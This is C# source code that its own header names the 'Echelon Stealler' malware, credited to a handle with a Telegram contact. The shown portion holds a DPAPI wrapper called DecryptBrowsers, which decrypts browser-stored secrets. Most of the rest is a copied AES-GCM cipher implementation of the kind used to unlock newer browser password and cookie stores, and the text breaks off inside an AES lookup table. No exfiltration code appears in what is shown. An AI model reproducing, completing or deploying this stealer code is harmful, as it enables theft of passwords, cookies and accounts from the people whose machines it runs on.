///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Echelon
{
    class DecryptAPI
	{
        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();
            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch
                {
                }
                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch
                {
                }
                CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
    }

	public sealed class Arrays
	{
		private Arrays()
		{
		}

		public static bool AreEqual(bool[] a, bool[] b)
		{
			if (a == b)
			{
				return true;
			}
			if (a == null || b == null)
			{
				return false;
			}
			return HaveSameContents(a, b);
		}

		public static bool AreEqual(char[] a, char[] b)
		{
			if (a == b)
			{
				return true;
			}
			if (a == null || b == null)
			{
				return false;
			}
			return HaveSameContents(a, b);
		}

		public static bool AreEqual(byte[] a, byte[] b)
		{
			if (a == b)
			{
				return true;
			}
			if (a == null || b == null)
			{
				return false;
			}
			return HaveSameContents(a, b);
		}

		[Obsolete("Use 'AreEqual' method instead")]
		public static bool AreSame(byte[] a, byte[] b)
		{
			return AreEqual(a, b);
		}

		public static bool ConstantTimeAreEqual(byte[] a, byte[] b)
		{
			int num = a.Length;
			if (num != b.Length)
			{
				return false;
			}
			int num2 = 0;
			while (num != 0)
			{
				num--;
				num2 |= (a[num] ^ b[num]);
			}
			return num2 == 0;
		}

		public static bool AreEqual(int[] a, int[] b)
		{
			if (a == b)
			{
				return true;
			}
			if (a == null || b == null)
			{
				return false;
			}
			return HaveSameContents(a, b);
		}

		private static bool HaveSameContents(bool[] a, bool[] b)
		{
			int num = a.Length;
			if (num != b.Length)
			{
				return false;
			}
			while (num != 0)
			{
				num--;
				if (a[num] != b[num])
				{
					return false;
				}
			}
			return true;
		}

		private static bool HaveSameContents(char[] a, char[] b)
		{
			int num = a.Length;
			if (num != b.Length)
			{
				return false;
			}
			while (num != 0)
			{
				num--;
				if (a[num] != b[num])
				{
					return false;
				}
			}
			return true;
		}

		private static bool HaveSameContents(byte[] a, byte[] b)
		{
			int num = a.Length;
			if (num != b.Length)
			{
				return false;
			}
			while (num != 0)
			{
				num--;
				if (a[num] != b[num])
				{
					return false;
				}
			}
			return true;
		}

		private static bool HaveSameContents(int[] a, int[] b)
		{
			int num = a.Length;
			if (num != b.Length)
			{
				return false;
			}
			while (num != 0)
			{
				num--;
				if (a[num] != b[num])
				{
					return false;
				}
			}
			return true;
		}

		public static string ToString(object[] a)
		{
			StringBuilder stringBuilder = new StringBuilder(91);
			if (a.Length != 0)
			{
				stringBuilder.Append(a[0]);
				for (int i = 1; i < a.Length; i++)
				{
					stringBuilder.Append(", ").Append(a[i]);
				}
			}
			stringBuilder.Append(']');
			return stringBuilder.ToString();
		}

		public static int GetHashCode(byte[] data)
		{
			if (data == null)
			{
				return 0;
			}
			int num = data.Length;
			int num2 = num + 1;
			while (--num >= 0)
			{
				num2 *= 257;
				num2 ^= data[num];
			}
			return num2;
		}

		public static byte[] Clone(byte[] data)
		{
			if (data != null)
			{
				return (byte[])data.Clone();
			}
			return null;
		}

		public static int[] Clone(int[] data)
		{
			if (data != null)
			{
				return (int[])data.Clone();
			}
			return null;
		}
	}

	internal sealed class Pack
	{
		private Pack()
		{
		}

		internal static void UInt32_To_BE(uint n, byte[] bs)
		{
			bs[0] = (byte)(n >> 24);
			bs[1] = (byte)(n >> 16);
			bs[2] = (byte)(n >> 8);
			bs[3] = (byte)n;
		}

		internal static void UInt32_To_BE(uint n, byte[] bs, int off)
		{
			bs[off] = (byte)(n >> 24);
			bs[++off] = (byte)(n >> 16);
			bs[++off] = (byte)(n >> 8);
			bs[++off] = (byte)n;
		}

		internal static uint BE_To_UInt32(byte[] bs)
		{
			return (uint)((bs[0] << 24) | (bs[1] << 16) | (bs[2] << 8) | bs[3]);
		}

		internal static uint BE_To_UInt32(byte[] bs, int off)
		{
			return (uint)((bs[off] << 24) | (bs[++off] << 16) | (bs[++off] << 8) | bs[++off]);
		}

		internal static ulong BE_To_UInt64(byte[] bs)
		{
			uint num = BE_To_UInt32(bs);
			uint num2 = BE_To_UInt32(bs, 4);
			return ((ulong)num << 32) | num2;
		}

		internal static ulong BE_To_UInt64(byte[] bs, int off)
		{
			uint num = BE_To_UInt32(bs, off);
			uint num2 = BE_To_UInt32(bs, off + 4);
			return ((ulong)num << 32) | num2;
		}

		internal static void UInt64_To_BE(ulong n, byte[] bs)
		{
			UInt32_To_BE((uint)(n >> 32), bs);
			UInt32_To_BE((uint)n, bs, 4);
		}

		internal static void UInt64_To_BE(ulong n, byte[] bs, int off)
		{
			UInt32_To_BE((uint)(n >> 32), bs, off);
			UInt32_To_BE((uint)n, bs, off + 4);
		}

		internal static void UInt32_To_LE(uint n, byte[] bs)
		{
			bs[0] = (byte)n;
			bs[1] = (byte)(n >> 8);
			bs[2] = (byte)(n >> 16);
			bs[3] = (byte)(n >> 24);
		}

		internal static void UInt32_To_LE(uint n, byte[] bs, int off)
		{
			bs[off] = (byte)n;
			bs[++off] = (byte)(n >> 8);
			bs[++off] = (byte)(n >> 16);
			bs[++off] = (byte)(n >> 24);
		}

		internal static uint LE_To_UInt32(byte[] bs)
		{
			return (uint)(bs[0] | (bs[1] << 8) | (bs[2] << 16) | (bs[3] << 24));
		}

		internal static uint LE_To_UInt32(byte[] bs, int off)
		{
			return (uint)(bs[off] | (bs[++off] << 8) | (bs[++off] << 16) | (bs[++off] << 24));
		}

		internal static ulong LE_To_UInt64(byte[] bs)
		{
			uint num = LE_To_UInt32(bs);
			return ((ulong)LE_To_UInt32(bs, 4) << 32) | num;
		}

		internal static ulong LE_To_UInt64(byte[] bs, int off)
		{
			uint num = LE_To_UInt32(bs, off);
			return ((ulong)LE_To_UInt32(bs, off + 4) << 32) | num;
		}

		internal static void UInt64_To_LE(ulong n, byte[] bs)
		{
			UInt32_To_LE((uint)n, bs);
			UInt32_To_LE((uint)(n >> 32), bs, 4);
		}

		internal static void UInt64_To_LE(ulong n, byte[] bs, int off)
		{
			UInt32_To_LE((uint)n, bs, off);
			UInt32_To_LE((uint)(n >> 32), bs, off + 4);
		}
	}

	public class ParametersWithIV : ICipherParameters
	{
		private readonly ICipherParameters parameters;

		private readonly byte[] iv;

		public ICipherParameters Parameters => parameters;

		public ParametersWithIV(ICipherParameters parameters, byte[] iv)
			: this(parameters, iv, 0, iv.Length)
		{
		}

		public ParametersWithIV(ICipherParameters parameters, byte[] iv, int ivOff, int ivLen)
		{
			if (parameters == null)
			{
				throw new ArgumentNullException("parameters");
			}
			if (iv == null)
			{
				throw new ArgumentNullException("iv");
			}
			this.parameters = parameters;
			this.iv = new byte[ivLen];
			Array.Copy(iv, ivOff, this.iv, 0, ivLen);
		}

		public byte[] GetIV()
		{
			return (byte[])iv.Clone();
		}
	}
	public class KeyParameter : ICipherParameters
	{
		private readonly byte[] key;

		public KeyParameter(byte[] key)
		{
			if (key == null)
			{
				throw new ArgumentNullException("key");
			}
			this.key = (byte[])key.Clone();
		}

		public KeyParameter(byte[] key, int keyOff, int keyLen)
		{
			if (key == null)
			{
				throw new ArgumentNullException("key");
			}
			if (keyOff < 0 || keyOff > key.Length)
			{
				throw new ArgumentOutOfRangeException("keyOff");
			}
			if (keyLen < 0 || keyOff + keyLen > key.Length)
			{
				throw new ArgumentOutOfRangeException("keyLen");
			}
			this.key = new byte[keyLen];
			Array.Copy(key, keyOff, this.key, 0, keyLen);
		}

		public byte[] GetKey()
		{
			return (byte[])key.Clone();
		}
	}

	internal abstract class GcmUtilities
	{
		internal static byte[] OneAsBytes()
		{
			return new byte[16]
			{
				128,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0,
				0
			};
		}

		internal static uint[] OneAsUints()
		{
			return new uint[4]
			{
				2147483648u,
				0u,
				0u,
				0u
			};
		}

		internal static uint[] AsUints(byte[] bs)
		{
			return new uint[4]
			{
				Pack.BE_To_UInt32(bs, 0),
				Pack.BE_To_UInt32(bs, 4),
				Pack.BE_To_UInt32(bs, 8),
				Pack.BE_To_UInt32(bs, 12)
			};
		}

		internal static void Multiply(byte[] block, byte[] val)
		{
			byte[] array = Arrays.Clone(block);
			byte[] array2 = new byte[16];
			for (int i = 0; i < 16; i++)
			{
				byte b = val[i];
				for (int num = 7; num >= 0; num--)
				{
					if ((b & (1 << num)) != 0)
					{
						Xor(array2, array);
					}
					bool num2 = (array[15] & 1) != 0;
					ShiftRight(array);
					if (num2)
					{
						array[0] ^= 225;
					}
				}
			}
			Array.Copy(array2, 0, block, 0, 16);
		}

		internal static void MultiplyP(uint[] x)
		{
			bool num = (x[3] & 1) != 0;
			ShiftRight(x);
			if (num)
			{
				x[0] ^= 3774873600u;
			}
		}

		internal static void MultiplyP8(uint[] x)
		{
			uint num = x[3];
			ShiftRightN(x, 8);
			for (int num2 = 7; num2 >= 0; num2--)
			{
				if ((num & (1 << num2)) != 0L)
				{
					x[0] ^= 3774873600u >> 7 - num2;
				}
			}
		}

		internal static void ShiftRight(byte[] block)
		{
			int num = 0;
			byte b = 0;
			while (true)
			{
				byte b2 = block[num];
				block[num] = (byte)((b2 >> 1) | b);
				if (++num != 16)
				{
					b = (byte)(b2 << 7);
					continue;
				}
				break;
			}
		}

		internal static void ShiftRight(uint[] block)
		{
			int num = 0;
			uint num2 = 0u;
			while (true)
			{
				uint num3 = block[num];
				block[num] = ((num3 >> 1) | num2);
				if (++num != 4)
				{
					num2 = num3 << 31;
					continue;
				}
				break;
			}
		}

		internal static void ShiftRightN(uint[] block, int n)
		{
			int num = 0;
			uint num2 = 0u;
			while (true)
			{
				uint num3 = block[num];
				block[num] = ((num3 >> n) | num2);
				if (++num != 4)
				{
					num2 = num3 << 32 - n;
					continue;
				}
				break;
			}
		}

		internal static void Xor(byte[] block, byte[] val)
		{
			for (int num = 15; num >= 0; num--)
			{
				block[num] ^= val[num];
			}
		}

		internal static void Xor(uint[] block, uint[] val)
		{
			for (int num = 3; num >= 0; num--)
			{
				block[num] ^= val[num];
			}
		}
	}

	public interface IGcmMultiplier
	{
		void Init(byte[] H);

		void MultiplyH(byte[] x);
	}

	public class Tables8kGcmMultiplier : IGcmMultiplier
	{
		private readonly uint[][][] M = new uint[32][][];

		public void Init(byte[] H)
		{
			M[0] = new uint[16][];
			M[1] = new uint[16][];
			M[0][0] = new uint[4];
			M[1][0] = new uint[4];
			M[1][8] = GcmUtilities.AsUints(H);
			for (int num = 4; num >= 1; num >>= 1)
			{
				uint[] array = (uint[])M[1][num + num].Clone();
				GcmUtilities.MultiplyP(array);
				M[1][num] = array;
			}
			uint[] array2 = (uint[])M[1][1].Clone();
			GcmUtilities.MultiplyP(array2);
			M[0][8] = array2;
			for (int num2 = 4; num2 >= 1; num2 >>= 1)
			{
				uint[] array3 = (uint[])M[0][num2 + num2].Clone();
				GcmUtilities.MultiplyP(array3);
				M[0][num2] = array3;
			}
			int num3 = 0;
			while (true)
			{
				for (int i = 2; i < 16; i += i)
				{
					for (int j = 1; j < i; j++)
					{
						uint[] array4 = (uint[])M[num3][i].Clone();
						GcmUtilities.Xor(array4, M[num3][j]);
						M[num3][i + j] = array4;
					}
				}
				if (++num3 == 32)
				{
					break;
				}
				if (num3 > 1)
				{
					M[num3] = new uint[16][];
					M[num3][0] = new uint[4];
					for (int num4 = 8; num4 > 0; num4 >>= 1)
					{
						uint[] array5 = (uint[])M[num3 - 2][num4].Clone();
						GcmUtilities.MultiplyP8(array5);
						M[num3][num4] = array5;
					}
				}
			}
		}

		public void MultiplyH(byte[] x)
		{
			uint[] array = new uint[4];
			for (int num = 15; num >= 0; num--)
			{
				uint[] array2 = M[num + num][x[num] & 0xF];
				array[0] ^= array2[0];
				array[1] ^= array2[1];
				array[2] ^= array2[2];
				array[3] ^= array2[3];
				array2 = M[num + num + 1][(x[num] & 0xF0) >> 4];
				array[0] ^= array2[0];
				array[1] ^= array2[1];
				array[2] ^= array2[2];
				array[3] ^= array2[3];
			}
			Pack.UInt32_To_BE(array[0], x, 0);
			Pack.UInt32_To_BE(array[1], x, 4);
			Pack.UInt32_To_BE(array[2], x, 8);
			Pack.UInt32_To_BE(array[3], x, 12);
		}
	}

	public class GcmBlockCipher : IAeadBlockCipher
	{
		private const int BlockSize = 16;

		private static readonly byte[] Zeroes = new byte[16];

		private readonly IBlockCipher cipher;

		private readonly IGcmMultiplier multiplier;

		private bool forEncryption;

		private int macSize;

		private byte[] nonce;

		private byte[] A;

		private KeyParameter keyParam;

		private byte[] H;

		private byte[] initS;

		private byte[] J0;

		private byte[] bufBlock;

		private byte[] macBlock;

		private byte[] S;

		private byte[] counter;

		private int bufOff;

		private ulong totalLength;

		public virtual string AlgorithmName => cipher.AlgorithmName + "/GCM";

		public GcmBlockCipher(IBlockCipher c)
			: this(c, null)
		{
		}

		public GcmBlockCipher(IBlockCipher c, IGcmMultiplier m)
		{
			if (c.GetBlockSize() != 16)
			{
				throw new ArgumentException("cipher required with a block size of " + 16 + ".");
			}
			if (m == null)
			{
				m = new Tables8kGcmMultiplier();
			}
			cipher = c;
			multiplier = m;
		}

		public virtual int GetBlockSize()
		{
			return 16;
		}

		public virtual void Init(bool forEncryption, ICipherParameters parameters)
		{
			this.forEncryption = forEncryption;
			macBlock = null;
			if (parameters is AeadParameters)
			{
				AeadParameters aeadParameters = (AeadParameters)parameters;
				nonce = aeadParameters.GetNonce();
				A = aeadParameters.GetAssociatedText();
				int num = aeadParameters.MacSize;
				if (num < 96 || num > 128 || num % 8 != 0)
				{
					throw new ArgumentException("Invalid value for MAC size: " + num);
				}
				macSize = num / 8;
				keyParam = aeadParameters.Key;
			}
			else
			{
				if (!(parameters is ParametersWithIV))
				{
					throw new ArgumentException("invalid parameters passed to GCM");
				}
				ParametersWithIV parametersWithIV = (ParametersWithIV)parameters;
				nonce = parametersWithIV.GetIV();
				A = null;
				macSize = 16;
				keyParam = (KeyParameter)parametersWithIV.Parameters;
			}
			int num2 = forEncryption ? 16 : (16 + macSize);
			bufBlock = new byte[num2];
			if (nonce == null || nonce.Length < 1)
			{
				throw new ArgumentException("IV must be at least 1 byte");
			}
			if (A == null)
			{
				A = new byte[0];
			}
			cipher.Init(true, keyParam);
			H = new byte[16];
			cipher.ProcessBlock(H, 0, H, 0);
			multiplier.Init(H);
			initS = gHASH(A);
			if (nonce.Length == 12)
			{
				J0 = new byte[16];
				Array.Copy(nonce, 0, J0, 0, nonce.Length);
				J0[15] = 1;
			}
			else
			{
				J0 = gHASH(nonce);
				byte[] array = new byte[16];
				packLength((ulong)((long)nonce.Length * 8L), array, 8);
				GcmUtilities.Xor(J0, array);
				multiplier.MultiplyH(J0);
			}
			S = Arrays.Clone(initS);
			counter = Arrays.Clone(J0);
			bufOff = 0;
			totalLength = 0uL;
		}

		public virtual byte[] GetMac()
		{
			return Arrays.Clone(macBlock);
		}

		public virtual int GetOutputSize(int len)
		{
			if (forEncryption)
			{
				return len + bufOff + macSize;
			}
			return len + bufOff - macSize;
		}

		public virtual int GetUpdateOutputSize(int len)
		{
			return (len + bufOff) / 16 * 16;
		}

		public virtual int ProcessByte(byte input, byte[] output, int outOff)
		{
			return Process(input, output, outOff);
		}

		public virtual int ProcessBytes(byte[] input, int inOff, int len, byte[] output, int outOff)
		{
			int num = 0;
			for (int i = 0; i != len; i++)
			{
				bufBlock[bufOff++] = input[inOff + i];
				if (bufOff == bufBlock.Length)
				{
					gCTRBlock(bufBlock, 16, output, outOff + num);
					if (!forEncryption)
					{
						Array.Copy(bufBlock, 16, bufBlock, 0, macSize);
					}
					bufOff = bufBlock.Length - 16;
					num += 16;
				}
			}
			return num;
		}

		private int Process(byte input, byte[] output, int outOff)
		{
			bufBlock[bufOff++] = input;
			if (bufOff == bufBlock.Length)
			{
				gCTRBlock(bufBlock, 16, output, outOff);
				if (!forEncryption)
				{
					Array.Copy(bufBlock, 16, bufBlock, 0, macSize);
				}
				bufOff = bufBlock.Length - 16;
				return 16;
			}
			return 0;
		}

		public int DoFinal(byte[] output, int outOff)
		{
			int num = bufOff;
			if (!forEncryption)
			{
				if (num < macSize)
				{
					throw new InvalidCipherTextException("data too short");
				}
				num -= macSize;
			}
			if (num > 0)
			{
				byte[] array = new byte[16];
				Array.Copy(bufBlock, 0, array, 0, num);
				gCTRBlock(array, num, output, outOff);
			}
			byte[] array2 = new byte[16];
			packLength((ulong)((long)A.Length * 8L), array2, 0);
			packLength(totalLength * 8, array2, 8);
			GcmUtilities.Xor(S, array2);
			multiplier.MultiplyH(S);
			byte[] array3 = new byte[16];
			cipher.ProcessBlock(J0, 0, array3, 0);
			GcmUtilities.Xor(array3, S);
			int num2 = num;
			macBlock = new byte[macSize];
			Array.Copy(array3, 0, macBlock, 0, macSize);
			if (forEncryption)
			{
				Array.Copy(macBlock, 0, output, outOff + bufOff, macSize);
				num2 += macSize;
			}
			else
			{
				byte[] array4 = new byte[macSize];
				Array.Copy(bufBlock, num, array4, 0, macSize);
				if (!Arrays.ConstantTimeAreEqual(macBlock, array4))
				{
					throw new InvalidCipherTextException("mac check in GCM failed");
				}
			}
			Reset(clearMac: false);
			return num2;
		}

		public virtual void Reset()
		{
			Reset(clearMac: true);
		}

		private void Reset(bool clearMac)
		{
			S = Arrays.Clone(initS);
			counter = Arrays.Clone(J0);
			bufOff = 0;
			totalLength = 0uL;
			if (bufBlock != null)
			{
				Array.Clear(bufBlock, 0, bufBlock.Length);
			}
			if (clearMac)
			{
				macBlock = null;
			}
			cipher.Reset();
		}

		private void gCTRBlock(byte[] buf, int bufCount, byte[] output, int outOff)
		{
			int num = 15;
			while (num >= 12 && ++counter[num] == 0)
			{
				num--;
			}
			byte[] array = new byte[16];
			cipher.ProcessBlock(counter, 0, array, 0);
			byte[] val;
			if (forEncryption)
			{
				Array.Copy(Zeroes, bufCount, array, bufCount, 16 - bufCount);
				val = array;
			}
			else
			{
				val = buf;
			}
			for (int num2 = bufCount - 1; num2 >= 0; num2--)
			{
				array[num2] ^= buf[num2];
				output[outOff + num2] = array[num2];
			}
			GcmUtilities.Xor(S, val);
			multiplier.MultiplyH(S);
			totalLength += (ulong)bufCount;
		}

		private byte[] gHASH(byte[] b)
		{
			byte[] array = new byte[16];
			for (int i = 0; i < b.Length; i += 16)
			{
				byte[] array2 = new byte[16];
				int length = Math.Min(b.Length - i, 16);
				Array.Copy(b, i, array2, 0, length);
				GcmUtilities.Xor(array, array2);
				multiplier.MultiplyH(array);
			}
			return array;
		}

		private static void packLength(ulong len, byte[] bs, int off)
		{
			Pack.UInt32_To_BE((uint)(len >> 32), bs, off);
			Pack.UInt32_To_BE((uint)len, bs, off + 4);
		}
	}

	public interface IAeadBlockCipher
	{
		string AlgorithmName
		{
			get;
		}

		void Init(bool forEncryption, ICipherParameters parameters);

		int GetBlockSize();

		int ProcessByte(byte input, byte[] outBytes, int outOff);

		int ProcessBytes(byte[] inBytes, int inOff, int len, byte[] outBytes, int outOff);

		int DoFinal(byte[] outBytes, int outOff);

		byte[] GetMac();

		int GetUpdateOutputSize(int len);

		int GetOutputSize(int len);

		void Reset();
	}

	public class AesFastEngine : IBlockCipher
	{
		private static readonly byte[] S = new byte[256]
		{
			99,
			124,
			119,
			123,
			242,
			107,
			111,
			197,
			48,
			1,
			103,
			43,
			254,
			215,
			171,
			118,
			202,
			130,
			201,
			125,
			250,
			89,
			71,
			240,
			173,
			212,
			162,
			175,
			156,
			164,
			114,
			192,
			183,
			253,
			147,
			38,
			54,
			63,
			247,
			204,
			52,
			165,
			229,
			241,
			113,
			216,
			49,
			21,
			4,
			199,
			35,
			195,
			24,
			150,
			5,
			154,
			7,
			18,
			128,
			226,
			235,
			39,
			178,
			117,
			9,
			131,
			44,
			26,
			27,
			110,
			90,
			160,
			82,
			59,
			214,
			179,
			41,
			227,
			47,
			132,
			83,
			209,
			0,
			237,
			32,
			252,
			177,
			91,
			106,
			203,
			190,
			57,
			74,
			76,
			88,
			207,
			208,
			239,
			170,
			251,
			67,
			77,
			51,
			133,
			69,
			249,
			2,
			127,
			80,
			60,
			159,
			168,
			81,
			163,
			64,
			143,
			146,
			157,
			56,
			245,
			188,
			182,
			218,
			33,
			16,
			255,
			243,
			210,
			205,
			12,
			19,
			236,
			95,
			151,
			68,
			23,
			196,
			167,
			126,
			61,
			100,
			93,
			25,
			115,
			96,
			129,
			79,
			220,
			34,
			42,
			144,
			136,
			70,
			238,
			184,
			20,
			222,
			94,
			11,
			219,
			224,
			50,
			58,
			10,
			73,
			6,
			36,
			92,
			194,
			211,
			172,
			98,
			145,
			149,
			228,
			121,
			231,
			200,
			55,
			109,
			141,
			213,
			78,
			169,
			108,
			86,
			244,
			234,
			101,
			122,
			174,
			8,
			186,
			120,
			37,
			46,
			28,
			166,
			180,
			198,
			232,
			221,
			116,
			31,
			75,
			189,
			139,
			138,
			112,
			62,
			181,
			102,
			72,
			3,
			246,
			14,
			97,
			53,
			87,
			185,
			134,
			193,
			29,
			158,
			225,
			248,
			152,
			17,
			105,
			217,
			142,
			148,
			155,
			30,
			135,
			233,
			206,
			85,
			40,
			223,
			140,
			161,
			137,
			13,
			191,
			230,
			66,
			104,
			65,
			153,
			45,
			15,
			176,
			84,
			187,
			22
		};

		private static readonly byte[] Si = new byte[256]
		{
			82,
			9,
			106,
			213,
			48,
			54,
			165,
			56,
			191,
			64,
			163,
			158,
			129,
			243,
			215,
			251,
			124,
			227,
			57,
			130,
			155,
			47,
			255,
			135,
			52,
			142,
			67,
			68,
			196,
			222,
			233,
			203,
			84,
			123,
			148,
			50,
			166,
			194,
			35,
			61,
			238,
			76,
			149,
			11,
			66,
			250,
			195,
			78,
			8,
			46,
			161,
			102,
			40,
			217,
			36,
			178,
			118,
			91,
			162,
			73,
			109,
			139,
			209,
			37,
			114,
			248,
			246,
			100,
			134,
			104,
			152,
			22,
			212,
			164,
			92,
			204,
			93,
			101,
			182,
			146,
			108,
			112,
			72,
			80,
			253,
			237,
			185,
			218,
			94,
			21,
			70,
			87,
			167,
			141,
			157,
			132,
			144,
			216,
			171,
			0,
			140,
			188,
			211,
			10,
			247,
			228,
			88,
			5,
			184,
			179,
			69,
			6,
			208,
			44,
			30,
			143,
			202,
			63,
			15,
			2,
			193,
			175,
			189,
			3,
			1,
			19,
			138,
			107,
			58,
			145,
			17,
			65,
			79,
			103,
			220,
			234,
			151,
			242,
			207,
			206,
			240,
			180,
			230,
			115,
			150,
			172,
			116,
			34,
			231,
			173,
			53,
			133,
			226,
			249,
			55,
			232,
			28,
			117,
			223,
			110,
			71,
			241,
			26,
			113,
			29,
			41,
			197,
			137,
			111,
			183,
			98,
			14,
			170,
			24,
			190,
			27,
			252,
			86,
			62,
			75,
			198,
			210,
			121,
			32,
			154,
			219,
			192,
			254,
			120,
			205,
			90,
			244,
			31,
			221,
			168,
			51,
			136,
			7,
			199,
			49,
			177,
			18,
			16,
			89,
			39,
			128,
			236,
			95,
			96,
			81,
			127,
			169,
			25,
			181,
			74,
			13,
			45,
			229,
			122,
			159,
			147,
			201,
			156,
			239,
			160,
			224,
			59,
			77,
			174,
			42,
			245,
			176,
			200,
			235,
			187,
			60,
			131,
			83,
			153,
			97,
			23,
			43,
			4,
			126,
			186,
			119,
			214,
			38,
			225,
			105,
			20,
			99,
			85,
			33,
			12,
			125
		};

		private static readonly byte[] rcon = new byte[30]
		{
			1,
			2,
			4,
			8,
			16,
			32,
			64,
			128,
			27,
			54,
			108,
			216,
			171,
			77,
			154,
			47,
			94,
			188,
			99,
			198,
			151,
			53,
			106,
			212,
			179,
			125,
			250,
			239,
			197,
			145
		};

		private static readonly uint[] T0 = new uint[256]
		{
			2774754246u,
			2222750968u,
			2574743534u,
			2373680118u,
			234025727u,
			3177933782u,
			2976870366u,
			1422247313u,
			1345335392u,
			50397442u,
			2842126286u,
			2099981142u,
			436141799u,
			1658312629u,
			3870010189u,
			2591454956u,
			1170918031u,
			2642575903u,
			1086966153u,
			2273148410u,
			368769775u,
			3948501426u,
			3376891790u,
			200339707u,
			3970805057u,
			1742001331u,
			4255294047u,
			3937382213u,
			3214711843u,
			4154762323u,
			2524082916u,
			1539358875u,
			3266819957u,
			486407649u,
			2928907069u,
			1780885068u,
			1513502316u,
			1094664062u,
			49805301u,
			1338821763u,
			1546925160u,
			4104496465u,
			887481809u,
			150073849u,
			2473685474u,
			1943591083u,
			1395732834u,
			1058346282u,
			201589768u,
			1388824469u,
			1696801606u,
			1589887901u,
			672667696u,
			2711000631u,
			251987210u,
			3046808111u,
			151455502u,
			907153956u,
			2608889883u,
			1038279391u,
			652995533u,
			1764173646u,
			3451040383u,
			2675275242u,
			453576978u,
			2659418909u,
			1949051992u,
			773462580u,
			756751158u,
			2993581788u,
			3998898868u,
			4221608027u,
			4132590244u,
			1295727478u,
			1641469623u,
			3467883389u,
			2066295122u,
			1055122397u,
			1898917726u,
			2542044179u,
			4115878822u,
			1758581177u,
			0u,
			753790401u,
			1612718144u,
			536673507u,
			3367088505u,
			3982187446u,
			3194645204u,
			1187761037u,
			3653156455u,
			1262041458u,
			3729410708u,
			3561770136u,
			3898103984u,
			1255133061u,
			1808847035u,
			720367557u,
			3853167183u,
			385612781u,
			3309519750u,
			3612167578u,
			1429418854u,
			2491778321u,
			3477423498u,
			284817897u,
			100794884u,
			2172616702u,
			4031795360u,
			1144798328u,
			3131023141u,
			3819481163u,
			4082192802u,
			4272137053u,
			3225436288u,
			2324664069u,
			2912064063u,
			3164445985u,
			1211644016u,
			83228145u,
			3753688163u,
			3249976951u,
			1977277103u,
			1663115586u,
			806359072u,
			452984805u,
			250868733u,
			1842533055u,
			1288555905u,
			336333848u,
			890442534u,
			804056259u,
			3781124030u,
			2727843637u,
			3427026056u,
			957814574u,
			1472513171u,
			4071073621u,
			2189328124u,
			1195195770u,
			2892260552u,
			3881655738u,
			723065138u,
			2507371494u,
			2690670784u,
			2558624025u,
			3511635870u,
			2145180835u,
			1713513028u,
			2116692564u,
			2878378043u,
			2206763019u,
			3393603212u,
			703524551u,
			3552098411u,
			1007948840u,
			2044649127u,
			3797835452u,
			487262998u,
			1994120109u,
			1004593371u,
			1446130276u,
			1312438900u,
			503974420u,
			3679013266u,
			168166924u,
			1814307912u,
			3831258296u,
			1573044895u,
			1859376061u,
			4021070915u,
			2791465668u,
			2828112185u,
			2761266481u,
			937747667u,
			2339994098u,
			854058965u,
			1137232011u,
			1496790894u,
			3077402074u,
			2358086913u,
			1691735473u,
			3528347292u,
			3769215305u,
			3027004632u,
			4199962284u,
			133494003u,
			636152527u,
			2942657994u,
			2390391540u,
			3920539207u,
			403179536u,
			3585784431u,
			2289596656u,
			1864705354u,
			1915629148u,
			605822008u,
			4054230615u,
			3350508659u,
			1371981463u,
			602466507u,
			2094914977u,
			2624877800u,
			555687742u,
			3712699286u,
			3703422305u,
			2257292045u,
			2240449039u,
			2423288032u,
			1111375484u,
			3300242801u,
			2858837708u,
			3628615824u,
			84083462u,
			32962295u,
			302911004u,
			2741068226u,
			1597322602u,
			4183250862u,
			3501832553u,
			2441512471u,
			1489093017u,
			656219450u,
			3114180135u,
			954327513u,
			335083755u,
			3013122091u,
			856756514u,
			3144247762u,
			1893325225u,
			2307821063u,
			2811532339u,
			3063651117u,
			572399164u,
			2458355477u,
			552200649u,
			1238290055u,
			4283782570u,
			2015897680u,
			2061492133u,
			2408352771u,
			4171342169u,
			2156497161u,
			386731290u,
			3669999461u,
			837215959u,
			3326231172u,
			3093850320u,
			3275833730u,
			2962856233u,
			1999449434u,
			286199582u,
